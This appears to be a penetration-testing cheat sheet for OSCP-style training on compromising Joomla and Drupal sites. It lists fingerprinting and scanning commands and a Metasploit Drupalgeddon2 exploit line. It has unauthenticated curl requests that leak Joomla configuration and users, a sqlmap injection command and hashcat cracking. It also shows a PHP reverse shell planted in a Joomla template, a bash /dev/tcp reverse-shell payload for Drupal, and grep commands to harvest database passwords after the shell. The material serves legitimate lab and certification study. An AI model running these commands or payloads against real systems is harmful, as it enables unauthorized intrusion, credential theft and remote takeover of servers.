# Joomla and Drupal

## Which one, and which version
curl -skI <Scheme>://<WebHost>/ | grep -i generator
curl -sk <Scheme>://<WebHost>/administrator/manifests/files/joomla.xml | grep -i '<version>'
curl -sk <Scheme>://<WebHost>/CHANGELOG.txt | head -5
curl -sk <Scheme>://<WebHost>/core/CHANGELOG.txt | head -5
- [ ] Joomla: /administrator/, /media/jui/ and option=com_ in the links
- [ ] Drupal: X-Generator: Drupal, /sites/default/files, /user/login, /node/1
- [ ] Drupal 7 keeps CHANGELOG.txt at the root, Drupal 8 and later under core/

## Scan
joomscan -u <Scheme>://<WebHost>
pipx install droopescan
droopescan scan drupal -u <Scheme>://<WebHost>
droopescan scan joomla -u <Scheme>://<WebHost>
- [ ] Every component, module and version through searchsploit

## Drupal: the known holes
- [ ] 7 before 7.58, 8 before 8.5.1: Drupalgeddon2, CVE-2018-7600, with no login
searchsploit drupalgeddon2
- [ ] OSCP one-target limit: this Metasploit exploit spends my one target, even if it fails
msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <TargetIP>; set RPORT <Port>; set LHOST <LHOST>; set LPORT <LPORT>; run'
- [ ] Over HTTPS: set SSL true before run
- [ ] 7 before 7.32: Drupalgeddon, CVE-2014-3704, SQL injection to a new admin
searchsploit drupalgeddon

## Joomla: the known holes
- [ ] 4.0.0 to 4.2.7: CVE-2023-23752, the configuration and users with no login
curl -sk '<Scheme>://<WebHost>/api/index.php/v1/config/application?public=true' | jq .
curl -sk '<Scheme>://<WebHost>/api/index.php/v1/users?public=true' | jq .
- [ ] The database password from there tried at /administrator for each user it lists, and over SSH
- [ ] 3.7.0: com_fields SQL injection, CVE-2017-8917
- [ ] Not on the OSCP exam: OffSec bans SQLmap; use the manual injection workflow in :Pb sqli
sqlmap -u '<Scheme>://<WebHost>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml' -p 'list[fullordering]' --risk=3 --level=5 --batch --dbs
- [ ] The admin's bcrypt hash from the users table, into hashes.txt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

## Joomla admin to shell
- [ ] System, Site Templates (older: Extensions, Templates, Templates), then the active template
- [ ] error.php edited to hold /usr/share/webshells/php/php-reverse-shell.php, with $ip and $port set, and saved
rlwrap nc -lvnp <LPORT>
curl -sk <Scheme>://<WebHost>/templates/THE-TEMPLATE/error.php

## Drupal admin to shell
- [ ] Drupal 7: Modules, PHP filter turned on, then new content in the PHP code text format, and Preview
<?php system("bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>
- [ ] Drupal 8 and later: no PHP filter in core, so a module of my own through Extend, Install new module

## After the shell
grep -iE "password|user|db" /var/www/html/configuration.php
grep -A 12 '^\$databases' /var/www/html/sites/default/settings.php
- [ ] Drupal $S$ hashes from the users_field_data table, or users on Drupal 7
hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt
- [ ] The database password tried for the local users, over SSH and with su
